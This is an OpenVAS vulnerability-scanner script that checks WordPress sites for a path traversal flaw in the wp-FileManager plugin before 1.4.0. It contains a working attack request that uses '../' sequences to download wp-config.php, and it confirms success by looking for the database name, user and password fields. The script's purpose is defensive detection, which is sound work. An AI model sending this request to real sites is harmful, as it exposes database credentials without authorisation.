###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_filemanager_file_dwnld_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# WordPress wp-FileManager Plugin File Download Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to download and
  read arbitrary files on the affected application.
  Impact Level: Application";

tag_affected = "Wordpress wp-FileManager Plugin before 1.4.0";
tag_insight = "The input passed via 'path' parameter to
  'wordpress/wp-content/plugins/wp-filemanager/incl/libfile.php' script is
  not properly validating '../'(dot dot) sequences before being returned
  to the user.";
tag_solution = "Upgrade to version 1.4.0 or later,
  For updates refer to http://wordpress.org/extend/plugins/wp-filemanager";
tag_summary = "This host is running WordPress with wp-FileManager plugin and is
  prone to file download vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803492";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-17 17:30:46 +0530 (Wed, 17 Apr 2013)");
  script_name("WordPress wp-FileManager Plugin File Download Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "www.exploit-db.com/exploits/25440");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/53421");
  script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/wp-filemanager/changelog");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/wordpress-wp-filemanager-file-download");
  script_xref(name : "URL" , value : "http://security4you.net/blog/wordpress-wp-filemanager-local-file-download-vulnerability");
  script_summary("Check for file download vulnerability in WordPress wp-FileManager Plugin");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Construct the attack request
url = dir + '/wp-content/plugins/wp-filemanager/incl/libfile.php'+
            '?&path=../../&filename=wp-config.php&action=download';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"wp-config.php}",
                   extra_check:make_list('DB_NAME', 'DB_USER', 'DB_PASSWORD')))
{
  security_warning(port);
  exit(0);
}
